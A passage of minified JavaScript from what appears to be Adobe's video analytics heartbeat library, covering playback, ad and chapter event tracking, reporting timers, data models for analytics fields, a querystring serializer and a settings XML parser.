0===t||!!t)?this._trigger(y,a):(this._trigger(v),this._trigger(m,a))}},a.prototype.trackTimedMetadata=function(e){this._logger.info(this._logTag,"#trackComplete()"),this._canProcess()&&this._startSessionIfNeeded("trackTimedMetadata")&&this._trigger(f,e)},a.prototype.trackChapterStart=function(){this._logger.info(this._logTag,"#trackChapterStart()"),this._canProcess()&&this._startSessionIfNeeded("#trackChapterStart")&&this._trigger(N)},a.prototype.trackChapterComplete=function(){this._logger.info(this._logTag,"#trackChapterComplete()"),this._canProcess()&&this._startSessionIfNeeded("trackChapterComplete")&&this._trigger(q)},a.prototype.trackChapterSkip=function(){this._logger.info(this._logTag,"#trackChapterSkip()"),this._canProcess()&&this._startSessionIfNeeded("trackChapterSkip")&&this._trigger(x)},a.prototype.trackAdBreakStart=function(){this._logger.info(this._logTag,"#trackAdBreakStart()"),this._canProcess()&&this._startSessionIfNeeded("trackAdBreakStart")&&(this._trigger(T),this._isTrackingAdBreak=!0)},a.prototype.trackAdBreakComplete=function(){this._logger.info(this._logTag,"#trackAdBreakComplete()"),this._canProcess()&&this._startSessionIfNeeded("trackAdBreakComplete")&&(this._trigger(S),this._isTrackingAdBreak=!1)},a.prototype.trackAdStart=function(){this._logger.info(this._logTag,"#trackAdStart()"),this._canProcess()&&this._startSessionIfNeeded("trackAdStart")&&(this._trigger(E),this._isTrackingAd=!0)},a.prototype.trackAdComplete=function(){this._logger.info(this._logTag,"#trackAdComplete()"),this._canProcess()&&this._startSessionIfNeeded("trackAdComplete")&&(this._trigger(D),this._isTrackingAd=!1)},a.prototype.trackAdSkip=function(){this._logger.info(this._logTag,"#trackAdSkip()"),this._canProcess()&&this._startSessionIfNeeded("trackAdSkip")&&(this._trigger(I),this._isTrackingAd=!1)},a.prototype.trackBitrateChange=function(){this._logger.info(this._logTag,"#trackBitrateChange()"),this._canProcess()&&this._startSessionIfNeeded("trackBitrateChange")&&this._trigger(j)},a.prototype.trackVideoPlayerError=function(e){if(this._logger.info(this._logTag,"#trackVideoPlayerError(errorId="+e+")"),this._startSessionIfNeeded("trackVideoPlayerError")){var t={};t[B]=u,t[U]=e,this._trigger(V,t)}},a.prototype.trackApplicationError=function(e){if(this._logger.info(this._logTag,"#trackApplicationError(errorId="+e+")"),this._startSessionIfNeeded("trackApplicationError")){var t={};t[B]=l,t[U]=e,this._trigger(V,t)}},a.prototype._registerCommands=function(){this._pluginManager.comply(this,"handleVideoIdleStart",this._cmdVideoIdleStart),this._pluginManager.comply(this,"handleVideoIdleResume",this._cmdVideoIdleResume)},a.prototype._registerBehaviours=function(){this._pluginManager.registerBehaviour(new i(c,R),this,"handleVideoIdleStart"),this._pluginManager.registerBehaviour(new i(c,M),this,"handleVideoIdleResume",[new o(d,"ad.isInAdBreak","isInAdBreak"),new o(d,"ad.isInAd","isInAd"),new o(d,"chapter.isInChapter","isInChapter")])},a.prototype._setupDataResolver=function(){function e(){return n.video||(n.video=s._delegate.getVideoInfo(),s._logger.info(s._logTag,"Data from delegate > VideoInfo: "+n.video)),n.video}function t(){return n.ad||(n.ad=s._delegate.getAdInfo(),s._logger.info(s._logTag,"Data from delegate > AdInfo: "+n.ad)),n.ad}function a(){return n.pod||(n.pod=s._delegate.getAdBreakInfo(),s._logger.info(s._logTag,"Data from delegate > AdBreakInfo: "+n.pod)),n.pod}function o(){return n.chapter||(n.chapter=s._delegate.getChapterInfo(),s._logger.info(s._logTag,"Data from delegate > ChapterInfo: "+n.chapter)),n.chapter}function i(){return n.qos||(n.qos=s._delegate.getQoSInfo(),s._logger.info(s._logTag,"Data from delegate > QoSInfo: "+n.qos)),n.qos}var r={},n={},s=this;r["video.id"]=function(){var t=e(),a=t?t.id:null;return s._logger.debug(s._logTag,"Resolving video.id: "+a),a},r["video.name"]=function(){var t=e(),a=t?t.name:null;return s._logger.debug(s._logTag,"Resolving video.name: "+a),a},r["video.length"]=function(){var t=e(),a=t?t.length:NaN;return s._logger.debug(s._logTag,"Resolving video.length: "+a),a},r["video.playerName"]=function(){var t=e(),a=t?t.playerName:null;return s._logger.debug(s._logTag,"Resolving video.playerName: "+a),a},r["video.mediaType"]=function(){var t=e(),a=t?t.mediaType:null;return s._logger.debug(s._logTag,"Resolving video.mediaType: "+a),a},r["video.streamType"]=function(){var t=e(),a=t?t.streamType:null;return s._logger.debug(s._logTag,"Resolving video.streamType: "+a),a},r["video.playhead"]=function(){var t=e(),a=t?t.playhead:NaN;return s._logger.debug(s._logTag,"Resolving video.playhead: "+a),a},r["video.resumed"]=function(){var t=e(),a=!!t&&t.resumed;return s._logger.debug(s._logTag,"Resolving video.resumed: "+a),a},r["video.playheadStalled"]=function(){return this._playheadStalled},r["pod.name"]=function(){var e=a(),t=e?e.name:null;return s._logger.debug(s._logTag,"Resolving pod.name: "+t),t},r["pod.playerName"]=function(){var e=a(),t=e?e.playerName:null;return s._logger.debug(s._logTag,"Resolving pod.playerName: "+t),t},r["pod.position"]=function(){var e=a(),t=e?e.position:NaN;return s._logger.debug(s._logTag,"Resolving pod.position: "+t),t},r["pod.startTime"]=function(){var e=a(),t=e?e.startTime:NaN;return s._logger.debug(s._logTag,"Resolving pod.startTime: "+t),t},r["ad.isInAd"]=function(){var e=null!=t();return s._logger.debug(s._logTag,"Resolving ad.isInAd: "+e),e},r["ad.isInAdBreak"]=function(){var e=null!=a();return s._logger.debug(s._logTag,"Resolving ad.isInAdBreak: "+e),e},r["ad.id"]=function(){var e=t(),a=e?e.id:null;return s._logger.debug(s._logTag,"Resolving ad.id: "+a),a},r["ad.name"]=function(){var e=t(),a=e?e.name:null;return s._logger.debug(s._logTag,"Resolving ad.name: "+a),a},r["ad.length"]=function(){var e=t(),a=e?e.length:NaN;return s._logger.debug(s._logTag,"Resolving ad.length: "+a),a},r["ad.position"]=function(){var e=t(),a=e?e.position:NaN;return s._logger.debug(s._logTag,"Resolving ad.position: "+a),a},r["ad.granularTracking"]=function(){var e=t(),a=!!e&&e.granularTracking;return s._logger.debug(s._logTag,"Resolving ad.granularTracking: "+a),a},r["ad.trackingInterval"]=function(){var e=$;return s._logger.debug(s._logTag,"Resolving ad.trackingInterval: "+e),e},r["chapter.isInChapter"]=function(){var e=null!=o();return s._logger.debug(s._logTag,"Resolving chapter.isInChapter: "+e),e},r["chapter.name"]=function(){var e=o(),t=e?e.name:null;return s._logger.debug(s._logTag,"Resolving chapter.name: "+t),t},r["chapter.length"]=function(){var e=o(),t=e?e.length:NaN;return s._logger.debug(s._logTag,"Resolving chapter.length: "+t),t},r["chapter.position"]=function(){var e=o(),t=e?e.position:NaN;return s._logger.debug(s._logTag,"Resolving chapter.position: "+t),t},r["chapter.startTime"]=function(){var e=o(),t=e?e.startTime:NaN;return s._logger.debug(s._logTag,"Resolving chapter.startTime: "+t),t},r["qos.bitrate"]=function(){var e=i(),t=e?e.bitrate:NaN;return s._logger.debug(s._logTag,"Resolving qos.bitrate: "+t),t},r["qos.fps"]=function(){var e=i(),t=e?e.fps:NaN;return s._logger.debug(s._logTag,"Resolving qos.fps: "+t),t},r["qos.droppedFrames"]=function(){var e=i(),t=e?e.droppedFrames:NaN;return s._logger.debug(s._logTag,"Resolving qos.droppedFrames: "+t),t},r["qos.startupTime"]=function(){var e=i(),t=e?1e3*e.startupTime:NaN;return s._logger.debug(s._logTag,"Resolving qos.startupTime: "+t),t},this._dataResolver=function(e){if(!e||0==e.length)return null;n={};for(var t=null,a=0;a<e.length;a++){var o=e[a];(t=t||{})[o]=r.hasOwnProperty(o)?r[o].call(this):null}return t}},a.prototype._trackPlayheadStall=function(){this._canProcess()&&(this._playheadStalled||(this._logger.info(this._logTag,"#_trackPlayheadStall()"),this._stalledPlayheadCount=0,this._playheadStalled=!0,this._trigger(w)))},a.prototype._trackExitStall=function(){this._canProcess()&&(this._stalledPlayheadCount=0,!this._playheadStalled||this._isPaused||this._isSeeking||this._isBuffering||(this._logger.info(this._logTag,"#_trackExitStall()"),this._playheadStalled=!1,this._trigger(b)))},a.prototype._startPlayheadTimer=function(){var e=this;this._playheadTimer||this._isPaused||this._isSeeking||this._isBuffering||(this._playheadTimer=setInterval((function(){if(e._canProcess()){var t=e._dataResolver(["ad.isInAd","video.playhead"]);if(e._isTrackingAdBreak)e._playheadStalled&&e._trackExitStall();else{var a=t["video.playhead"];a!=e._previousPlayhead?e._trackExitStall():e._previousPlayhead>=0&&a==e._previousPlayhead&&++e._stalledPlayheadCount==H&&e._trackPlayheadStall(),a!=e._previousPlayhead&&a>0&&!e._contentStarted&&(e._isPaused||e._isBuffering||e._isSeeking||(e._logger.info(e._logTag,"#_playheadTimer playhead progress to: "+a),e._trigger(k),e._contentStarted=!0)),e._previousPlayhead=a}}}),F))},a.prototype._stopPlayheadTimer=function(){this._playheadTimer&&(clearInterval(this._playheadTimer),this._playheadTimer=null),this._trackExitStall()},a.prototype._startSessionIfNeeded=function(e){return this._isTrackingSessionActive?(this._isTrackingSessionStarted||(this._logger.info(this._logTag,"#"+e+"() > Tracking session auto-start."),this.trackSessionStart()),!0):(this._logger.warn(this._logTag,"#"+e+"() > No active tracking session."),!1)},a.prototype._allowPlayerStateChange=function(){return!(this._isTrackingAdBreak&&!this._isTrackingAd&&(this._logger.info(this._logTag,"_allowPlayerStateChange Player plugin does not allow player state changes when in Adbreak and not in Ad."),1))};var s="player",d=s,c="adobe-heartbeat",l="sourceErrorExternal",u="sourceErrorSDK",g="video_load",p="video_unload",m="video_session_end",_="video_start",h="video_resume",y="video_complete",v="video_skip",f="timed_metadata",b="play",w="pause",k="content_start",T="adbreak_start",S="adbreak_complete",E="ad_start",D="ad_complete",I="ad_skip",P="buffer_start",C="buffer_complete",A="seek_start",L="seek_complete",N="chapter_start",q="chapter_complete",x="chapter_skip",j="bitrate_change",V="track_error",R="video_idle_start",M="video_idle_resume",O="callback",Q="filter_report",B="source",U="error_id",F=1001,$=1,H=2;t.VideoPlayerPlugin=a}(e.ADB.core,t),e.ADB.va.plugins.videoplayer||(e.ADB.va.plugins.videoplayer=t)}(this),function(e){if(void 0===t)var t={};t.clock||(t.clock={}),t.context||(t.context={}),t.filter||(t.filter={}),t.model||(t.model={}),t.network||(t.network={}),function(e,t){"use strict";function a(e,t,a,o,i){if(!t)throw new Error("Reference to the channel object cannot be NULL");if(this._channel=t,!e)throw new Error("Reference to the pluginManager object cannot be NULL");if(this._pluginManager=e,!i)throw new Error("Reference to the logger object cannot be NULL");this._logTag="ah::Timer."+a,this._logger=i,this._isDestroyed=!1,this._createTimer(a,o),this._installHandlers()}var o=e.Event;a.KEY_NAME="name",a.KEY_INTERVAL="interval",a.KEY_RESET="reset",a.prototype.resume=function(e){this._logger.debug(this._logTag,"Starting timer: "+this._name);var t={};t[a.KEY_NAME]=i+"."+this._name,t[a.KEY_RESET]=e,this._pluginManager.command(r,d,t)},a.prototype.pause=function(e){this._logger.debug(this._logTag,"Stopping timer: "+this._name);var t={};t[a.KEY_NAME]=i+"."+this._name,t[a.KEY_RESET]=e,this._pluginManager.command(r,s,t)},a.prototype.destroy=function(){if(!this._isDestroyed){this._isDestroyed=!0,this._uninstallHandlers();var e={};e[a.KEY_NAME]=i+"."+this._name,this._pluginManager.command(r,c,e)}},a.prototype.setInterval=function(e){var t=l+"."+i+"."+this._name,a=this._pluginManager.request(r,[t])[t];this.pause(!0),this._createTimer(this._name,e),a||this.resume(!0)},a.prototype._cmdResume=function(e){var t=!1;null!=e&&e.hasOwnProperty(a.KEY_RESET)&&(t=e[a.KEY_RESET]),this.resume(t)},a.prototype._cmdPause=function(e){var t=!1;null!=e&&e.hasOwnProperty(a.KEY_RESET)&&(t=e[a.KEY_RESET]),this.pause(t)},a.prototype._onTick=function(e,t){this._channel.trigger(new o("clock:"+this._name+".tick",t))},a.prototype._installHandlers=function(){this._channel.comply("clock:"+this._name+".resume",this._cmdResume,this),this._channel.comply("clock:"+this._name+".pause",this._cmdPause,this),this._pluginManager.on(r,i+"."+this._name+".tick",this._onTick,this)},a.prototype._uninstallHandlers=function(){this._channel.off(null,null,this),this._pluginManager.off(null,null,null,this)},a.prototype._createTimer=function(e,t){this._name=e,this._interval=t;var o={};o[a.KEY_NAME]=i+"."+this._name,o[a.KEY_INTERVAL]=this._interval,this._pluginManager.command(r,n,o)};var i="heartbeat",r="service.clock",n="create",s="pause",d="resume",c="destroy",l="is_paused";t.clock.Timer=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t,o){a.__super__.constructor.call(this,e,t,r,s,o)}var o=e.Event,i=t.clock.Timer;e.extend(a,i),a.prototype._onCheckStatusComplete=function(e){var t=e.data[u];if(this._logger.debug(this._logTag,"#_onCheckStatusComplete(interval="+t+")"),t){if(t==this._interval)return void this._logger.debug(this._logTag,"#_onCheckStatusComplete() > Interval value not changed.");t>n?(this._logger.warn(this._logTag,"#_onCheckStatusComplete() > Interval value too large: "+t),this.setInterval(n)):(this._logger.debug(this._logTag,"#_onCheckStatusComplete() > Interval changed to: "+t),this.setInterval(t))}else this._logger.warn(this._logTag,"#_onCheckStatusComplete() > Invalid interval value."),this.setInterval(s)},a.prototype._getSettings=function(e){this._logger.debug(this._logTag,"#_getSettings()"),this._channel.trigger(new o(d))},a.prototype._installHandlers=function(){a.__super__._installHandlers.call(this),this._channel.on(c,this._getSettings,this),this._channel.on(l,this._onCheckStatusComplete,this),this._channel.reply(u,(function(){return this._interval}),this)};var r="check_status",n=600,s=180,d="clock:check_status.tick",c="clock:check_status.get_settings",l="net:check_status_complete",u="check_status_interval";t.clock.CheckStatusTimer=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t,o){a.__super__.constructor.call(this,e,t,i,r,o),this._doNotOverrideInterval=!1}var o=t.clock.Timer;e.extend(a,o),a.prototype._onCheckStatusComplete=function(e){var t=e.data[n];if(this._logger.debug(this._logTag,"#_onCheckStatusComplete(interval="+t+")"),this._doNotOverrideInterval)this._logger.debug(this._logTag,"#_onCheckStatusComplete() > Interval value not changed. (doNotOverrideInterval = true)");else if(t){if(t==this._interval)return void this._logger.debug(this._logTag,"#_onCheckStatusComplete() > Interval value not changed.");this._logger.debug(this._logTag,"#_onCheckStatusComplete() > Interval changed to: "+t),this.setInterval(t)}else this._logger.warn(this._logTag,"#_onCheckStatusComplete() > Invalid interval value."),this.setInterval(r)},a.prototype._onUpdateReportingInterval=function(e){var t=e.data[n];if(this._doNotOverrideInterval=!!e.data[s],this._logger.debug(this._logTag,"#_onUpdateReportingInterval(interval="+t+", doNotOverrideInterval="+this._doNotOverrideInterval+")"),t){if(t==this._interval)return void this._logger.debug(this._logTag,"#_onUpdateReportingInterval() > Interval value not changed.");this._logger.debug(this._logTag,"#_onUpdateReportingInterval() > Interval changed to: "+t),this.setInterval(t)}else this._logger.warn(this._logTag,"#_onUpdateReportingInterval() > Invalid interval value."),this.setInterval(r)},a.prototype._installHandlers=function(){a.__super__._installHandlers.call(this),this._channel.on(c,this._onCheckStatusComplete,this),this._channel.on(d,this._onUpdateReportingInterval,this),this._channel.reply(n,(function(){return this._interval}),this)};var i="reporting",r=10,n="reporting_interval",s="do_not_override_interval",d="reporting:update_interval",c="net:check_status_complete";t.clock.ReportingTimer=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t,o){a.__super__.constructor.call(this,e,t,i,r,o)}var o=t.clock.Timer;e.extend(a,o);var i="idle",r=1800;t.clock.IdleTimer=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t,o){a.__super__.constructor.call(this,e,t,i,r,o)}var o=t.clock.Timer;e.extend(a,o);var i="flush_filter",r=.25;t.clock.FlushFilterTimer=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t,a){if(!e)throw new Error("Reference to the pluginManager object cannot be NULL");if(!t)throw new Error("Reference to the channel object cannot be NULL");if(!a)throw new Error("Reference to the logger object cannot be NULL");this._isDestroyed=!1,this._reportingTimer=new r(e,t,a),this._checkStatusTimer=new o(e,t,a),this._flushFilterTimer=new i(e,t,a),this._idleTimer=new n(e,t,a)}var o=t.clock.CheckStatusTimer,i=t.clock.FlushFilterTimer,r=t.clock.ReportingTimer,n=t.clock.IdleTimer;a.prototype.destroy=function(){this._isDestroyed||(this._isDestroyed=!0,this._reportingTimer.destroy(),this._checkStatusTimer.destroy(),this._flushFilterTimer.destroy(),this._idleTimer.destroy())},t.clock.Clock=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t){this.value=e,this.hint=t}function o(e){this.realm=e,this.data={}}a.HINT_SHORT="short",o.prototype.setField=function(e,t,o){this.data[e]=new a(t,o)},o.prototype._createAccessor=function(e,t,a){var o=this;return function(){return arguments.length&&(o[e]=arguments[0],o.setField(t,arguments[0],a)),o[e]}},t.model.Dao=o,t.model.DaoField=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"asset"),this.adId=this._createAccessor("_adId","ad_id",null),this.sid=this._createAccessor("_sid","ad_sid",null),this.resolver=this._createAccessor("_resolver","resolver",null),this.podId=this._createAccessor("_podId","pod_id",null),this.podPosition=this._createAccessor("_podPosition","pod_position",null),this.podOffset=this._createAccessor("_podOffset","pod_offset",null),this.podName=this._createAccessor("_podName","pod_name",null),this.adLength=this._createAccessor("_adLength","ad_length",null),this.adName=this._createAccessor("_adName","ad_name",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.adId(e.adId()),this.sid(e.sid()),this.resolver(e.resolver()),this.podId(e.podId()),this.podPosition(e.podPosition()),this.podOffset(e.podOffset()),this.podName(e.podName()),this.adLength(e.adLength()),this.adName(e.adName())}else this.adId(""),this.sid(""),this.resolver(""),this.podId(""),this.podPosition(""),this.podOffset(0),this.podName(""),this.adLength(0),this.adName("")}var o=t.model.Dao;e.extend(a,o),t.model.AdDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"sc"),this.reportSuiteId=this._createAccessor("_reportSuiteId","rsid",null),this.trackingServer=this._createAccessor("_trackingServer","tracking_server",null),this.ssl=this._createAccessor("_ssl","ssl",i.HINT_SHORT),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.reportSuiteId(e.reportSuiteId()),this.trackingServer(e.trackingServer()),this.ssl(e.ssl())}else this.reportSuiteId(""),this.trackingServer(""),this.ssl(0)}var o=t.model.Dao,i=t.model.DaoField;e.extend(a,o),t.model.AdobeAnalyticsDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"stream"),this.id=this._createAccessor("_id","chapter_id",null),this.sid=this._createAccessor("_sid","chapter_sid",null),this.name=this._createAccessor("_name","chapter_name",null),this.position=this._createAccessor("_position","chapter_pos",null),this.length=this._createAccessor("_length","chapter_length",null),this.offset=this._createAccessor("_offset","chapter_offset",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.id(e.id()),this.sid(e.sid()),this.name(e.name()),this.position(e.position()),this.length(e.length()),this.offset(e.offset())}else this.id(""),this.sid(""),this.name(""),this.position(0),this.length(0),this.offset(0)}var o=t.model.Dao;e.extend(a,o),t.model.ChapterDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"asset"),this.type=this._createAccessor("_type","type",null),this.videoId=this._createAccessor("_videoId","video_id",null),this.publisher=this._createAccessor("_publisher","publisher",null),this.adData=this._createAccessor("_adData","ad_data",null),this.chapterData=this._createAccessor("_chapterData","chapter_data",null),this.length=this._createAccessor("_length","length",null),this.name=this._createAccessor("_name","name",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.type(e.type()),this.name(e.name()),this.videoId(e.videoId()),this.publisher(e.publisher()),this.length(e.length());var t=e.adData()?new i(e.adData()):null;this.adData(t);var o=e.chapterData()?new r(e.chapterData()):null;this.chapterData(o)}else this.type(""),this.name(""),this.videoId(""),this.publisher(""),this.length(0),this.adData(null),this.chapterData(null)}var o=t.model.Dao,i=t.model.AdDao,r=t.model.ChapterDao;e.extend(a,o),a.TYPE_AD="ad",a.TYPE_MAIN_CONTENT="main",t.model.AssetDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"event"),this.type=this._createAccessor("_type","type",null),this.duration=this._createAccessor("_duration","duration",null),this.playhead=this._createAccessor("_playhead","playhead",null),this.id=this._createAccessor("_id","id",null),this.source=this._createAccessor("_source","source",null),this.ts=this._createAccessor("_ts","ts",null),this.prevTs=this._createAccessor("_prevTs","prev_ts",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.type(e.type()),this.duration(e.duration()),this.playhead(e.playhead()),this.id(e.id()),this.source(e.source()),this.ts(e.ts()),this.prevTs(e.prevTs())}else this.type(""),this.duration(0),this.playhead(0),this.id(""),this.source(""),this.ts(0),this.prevTs(-1)}var o=t.model.Dao;e.extend(a,o),a.EVENT_TYPE_AA_START="aa_start",a.EVENT_TYPE_AA_AD_START="aa_ad_start",a.EVENT_TYPE_START="start",a.EVENT_TYPE_RESUME="resume",a.EVENT_TYPE_CHAPTER_START="chapter_start",a.EVENT_TYPE_CHAPTER_COMPLETE="chapter_complete",a.EVENT_TYPE_CHAPTER_SKIP="chapter_skip",a.EVENT_TYPE_PLAY="play",a.EVENT_TYPE_PAUSE="pause",a.EVENT_TYPE_STALL="stall",a.EVENT_TYPE_BUFFER="buffer",a.EVENT_TYPE_BITRATE_CHANGE="bitrate_change",a.EVENT_TYPE_ERROR="error",a.EVENT_TYPE_COMPLETE="complete",a.EVENT_TYPE_SKIP="skip",a.EVENT_TYPE_END="end",t.model.EventDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"stream"),this.bitrate=this._createAccessor("_bitrate","bitrate",null),this.fps=this._createAccessor("_fps","fps",null),this.droppedFrames=this._createAccessor("_droppedFrames","dropped_frames",null),this.startupTime=this._createAccessor("_startup_time","startup_time",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.bitrate(e.bitrate()),this.fps(e.fps()),this.droppedFrames(e.droppedFrames()),this.startupTime(e.startupTime()),this.isStartupTimeOverridden=e.isStartupTimeOverridden}else this.bitrate(0),this.fps(0),this.droppedFrames(0),this.startupTime(0),this.isStartupTimeOverridden=!1}var o=t.model.Dao;e.extend(a,o),t.model.QoSDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"sp"),this.ovp=this._createAccessor("_ovp","ovp",null),this.sdk=this._createAccessor("_sdk","sdk",null),this.channel=this._createAccessor("_channel","channel",null),this.playerName=this._createAccessor("_playerName","player_name",null),this.libVersion=this._createAccessor("_libVersion","hb_version",null),this.apiLevel=this._createAccessor("_apiLevel","hb_api_lvl",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.ovp(e.ovp()),this.sdk(e.sdk()),this.channel(e.channel()),this.playerName(e.playerName()),this.libVersion(e.libVersion()),this.apiLevel(e.apiLevel())}else this.ovp(i),this.sdk(i),this.channel(i),this.playerName(""),this.libVersion(""),this.apiLevel(0)}var o=t.model.Dao;e.extend(a,o);var i="unknown";t.model.ServiceProviderDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"event"),this.sessionId=this._createAccessor("_sessionId","sid",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.sessionId(e.sessionId())}else this.sessionId(null)}var o=t.model.Dao;e.extend(a,o),t.model.SessionDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"stream"),this.type=this._createAccessor("_type","type",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.type(e.type())}else this.type(null)}var o=t.model.Dao;e.extend(a,o),t.model.StreamDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"user"),this.analyticsVisitorId=this._createAccessor("_analyticsVisitorId","aid",null),this.marketingCloudVisitorId=this._createAccessor("_marketingCloudVisitorId","mid",null),this.visitorId=this._createAccessor("_visitorId","id",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.analyticsVisitorId(e.analyticsVisitorId()),this.marketingCloudVisitorId(e.marketingCloudVisitorId()),this.visitorId(e.visitorId())}else this.analyticsVisitorId(null),this.marketingCloudVisitorId(null),this.visitorId(null)}var o=t.model.Dao;e.extend(a,o),t.model.UserDao=a}(e.ADB.core,t),function(e,t){"use strict";function a(){if(a.__super__.constructor.call(this,"aam"),this.audienceManagerBlob=this._createAccessor("_audienceManagerBlob","blob",null),this.audienceManagerLocationHint=this._createAccessor("_audienceManagerLocationHint","loc_hint",null),arguments.length&&arguments[0]instanceof a){var e=arguments[0];this.audienceManagerBlob(e.audienceManagerBlob()),this.audienceManagerLocationHint(e.audienceManagerLocationHint())}else this.audienceManagerBlob(null),this.audienceManagerLocationHint(null)}var o=t.model.Dao;e.extend(a,o),t.model.AudienceManagerDao=a}(e.ADB.core,t),function(e,t){"use strict";var a=e.ObjectUtils,o=t.model.EventDao,i=t.model.AssetDao,r=t.model.StreamDao,n=t.model.QoSDao;t.model.TrackItem=function(e,t,s,d,c){this.eventData=new o,this.eventData.type(t),this.eventData.duration(0),this.eventData.ts((new Date).getTime()),this.eventData.playhead(s),this.assetData=new i(e._assetData),this.streamData=new r(e._streamData),this.qosData=new n(e._qosData),this.cuserData=a.clone(e._cuserData),this.meta=d,this.callback=c,this.filterReport=!0}}(e.ADB.va.utils,t),function(e,t){"use strict";var a=e.ObjectUtils,o=t.model.EventDao,i=t.model.AssetDao,r=t.model.StreamDao,n=t.model.QoSDao;t.model.CUserDao,t.model.Report=function(e,t,s,d,c,l){this.adobeAnalyticsData=e,this.userData=t,this.aamData=s,this.serviceProviderData=d,this.sessionData=c,this.eventData=new o(l.eventData),this.assetData=new i(l.assetData),this.streamData=new r(l.streamData),this.qosData=new n(l.qosData),this.cuserData=a.clone(l.cuserData),this.meta=a.clone(l.meta),this.callback=l.callback,this.filterReport=l.filterReport}}(e.ADB.va.utils,t),function(e){"use strict";function t(){}t.prototype.serializeReport=function(e){},t.prototype.serializeDao=function(e){},t.prototype.serializeMap=function(e){},t.prototype.serializeNumber=function(e,t,a,o){},t.prototype.serializeString=function(e,t,a,o){},e.model.ISerializer=t}(t),function(e,t){"use strict";function a(e){if(!e)throw new Error("Reference to the logger object cannot be NULL");this._logger=e}var o=t.model.Dao,i=t.model.DaoField,r=t.model.ISerializer;e.extend(a,r),a.prototype.serializeReport=function(e){var t=[];return t.push(this.serializeDao(e.adobeAnalyticsData)),t.push(this.serializeDao(e.userData)),t.push(this.serializeDao(e.aamData)),t.push(this.serializeMap(e.cuserData,"cuser")),t.push(this.serializeDao(e.serviceProviderData)),t.push(this.serializeDao(e.sessionData)),t.push(this.serializeDao(e.eventData)),t.push(this.serializeDao(e.assetData)),t.push(this.serializeDao(e.streamData)),t.push(this.serializeDao(e.qosData)),t.push(this.serializeMap(e.meta,"meta")),{serializedOutput:t.filter((function(e){return!!e})).join("&"),callback:e.callback}},a.prototype.serializeDao=function(e){return this._processDao(e).filter((function(e){return!!e})).join("&")},a.prototype.serializeMap=function(e,t){var a=[],o=t||"meta";for(var i in e)e.hasOwnProperty(i)&&e[i]&&a.push("s:"+o+":"+i+"="+window.encodeURIComponent(e[i]));return a.join("&")},a.prototype.serializeNumber=function(e,t,a,o){var r=s;return null==t||isNaN(t)?null:(o===i.HINT_SHORT&&(r=d),r+":"+a+":"+e+"="+Math.floor(t))},a.prototype.serializeString=function(e,t,a,o){return t?c+":"+a+":"+e+"="+window.encodeURIComponent(t):null},a.prototype._processDao=function(e){var t=[];for(var a in e.data)if(e.data.hasOwnProperty(a)){var i=e.data[a],r=i.value,s=i.hint,d=null,c=e.realm;if(null==r)continue;"number"==typeof r?d=this.serializeNumber(a,r,c,s):"string"==typeof r?d=this.serializeString(a,r,c,s):r instanceof o?d=this.serializeDao(r):this._logger.warn(n,"#_processDao() > Unable to serialize DAO. Field: "+a+". Value: "+r+"."),d&&t.push(d)}return t};var n="ah::QuerystringSerializer",s="l",d="h",c="s";t.model.QuerystringSerializer=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t){if(!e)throw new Error("Reference to the data object cannot be NULL");if(this._data=e,!t)throw new Error("Reference to the logger object cannot be NULL");this._logger=t}a.prototype.parse=function(){var e,t,a,c,l,u,g;window.DOMParser?u=(new window.DOMParser).parseFromString(this._data,"text/xml"):((u=new window.ActiveXObject("Microsoft.XMLDOM")).async=!1,u.loadXML(this._data)),(g=parseInt(u.getElementsByTagName("trackingInterval")[0].childNodes[0].nodeValue,10))&&(e=g),(g=parseInt(u.getElementsByTagName("setupCheckInterval")[0].childNodes[0].nodeValue,10))&&(t=g),(g=parseInt(u.getElementsByTagName("trackExternalErrors")[0].childNodes[0].nodeValue,10))&&(a=1==g),u.getElementsByTagName("trackingDisabled")[0]&&(c=1==(g=parseInt(u.getElementsByTagName("trackingDisabled")[0].childNodes[0].nodeValue,10))),u.getElementsByTagName("nielsenEnabled")[0]?l=1==(g=parseInt(u.getElementsByTagName("nielsenEnabled")[0].childNodes[0].nodeValue,10)):l=!0;var p={};return p[i]=e,p[r]=t,p[n]=a,p[d]=c,p[s]=l,this._logger.debug(o,"#parse() > Obtained configuration settings."),p};var o="ah::SettingsParser",i="reporting_interval",r="check_status_interval",n="track_external_errors",s="nielsen_enabled",d="tracking_disabled";t.network.SettingsParser=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t){if(this._trackingServer=null,this._checkStatusServer=null,this._publisher=null,this._isConfigured=!1,this._isDestroyed=!1,this._quietMode=!1,this._visitorOptedOut=!1,this._prevReportSent=null,!e)throw new Error("Reference to the channel object cannot be NULL");if(this._channel=e,!t)throw new Error("Reference to the logger object cannot be NULL");this._logger=t,this._serializer=new d(t),this._installEventListeners()}var 